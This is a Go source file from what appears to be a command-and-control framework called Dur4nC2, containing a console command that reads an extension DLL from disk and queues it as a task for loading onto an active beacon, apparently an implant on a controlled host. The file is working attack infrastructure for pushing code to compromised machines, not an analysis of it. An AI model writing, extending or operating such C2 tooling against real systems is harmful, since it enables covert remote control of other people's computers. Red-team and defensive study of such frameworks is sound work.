package extensions

import (
	"Dur4nC2/misc/protobuf/commonpb"
	"Dur4nC2/misc/protobuf/implantpb"
	"Dur4nC2/server/console"
	"Dur4nC2/server/db"
	beaconRepository "Dur4nC2/server/domain/beacon/repository/postgres"
	"Dur4nC2/server/domain/models"
	taskRepository "Dur4nC2/server/domain/task/repository/postgres"
	"errors"
	"github.com/desertbit/grumble"
	"github.com/gofrs/uuid"
	"google.golang.org/protobuf/proto"
	"io/ioutil"
	"math/rand"
	"strings"
)

func ExtensionRegisterCmd(ctx *grumble.Context, con *console.ServerConsoleClient) (string, error) {
	extensionName := ctx.Args.String("extension-name")
	extensionManifest := installedExtensions[extensionName]
	if extensionManifest == nil {
		return "", errors.New("extension not found")
	}
	beacon := con.ActiveTarget.GetBeacon()
	if beacon == nil {
		return "", errors.New("non active beacon")
	}
	//TODO fix this to select a specific file
	filePath := strings.ReplaceAll(extensionManifest.Files[0].Path, "\\", "")
	dllData, err := ioutil.ReadFile(filePath)
	if err != nil {
		//con.PrintErrorf("error loading binary extension")
		return "", err
	}

	beaconRepo := beaconRepository.NewPostgresBeaconRepository(db.Session())
	currentBeacon, err := beaconRepo.Read(uuid.FromStringOrNil(beacon.ID))
	if err != nil {
		//con.PrintErrorf("%s\n", err)
		return "", err
	}

	request := &commonpb.Request{BeaconID: beacon.ID}
	registerExtensionReq := &implantpb.RegisterExtensionReq{
		Name:    extensionManifest.Name,
		OS:      extensionManifest.Files[0].OS,
		Init:    "",
		Data:    dllData,
		Request: request,
	}

	v := rand.Intn(999999999999999999-100000000000000000) + 100000000000000000
	data, _ := proto.Marshal(registerExtensionReq)
	taskReq := &implantpb.Envelope{
		ID:   int64(v),
		Type: implantpb.MsgRegisterExtensionReq,
		Data: data,
	}
	taskReqData, _ := proto.Marshal(taskReq)

	newTask := models.BeaconTask{
		EnvelopeID:  int64(v),
		BeaconID:    uuid.FromStringOrNil(beacon.ID),
		Description: "Loading " + extensionManifest.Name + " extension",
		State:       models.PENDING,
		Request:     taskReqData,
	}
	taskRepo := taskRepository.NewPostgresBeaconTaskRepository(db.Session())
	err = taskRepo.Create(currentBeacon, newTask)
	if err != nil {
		//con.PrintErrorf("%s\n", err)
		return "", err
	}
	con.PrintInfof("Task successfully added to the queue, please wait the response...")
	return "", nil
}
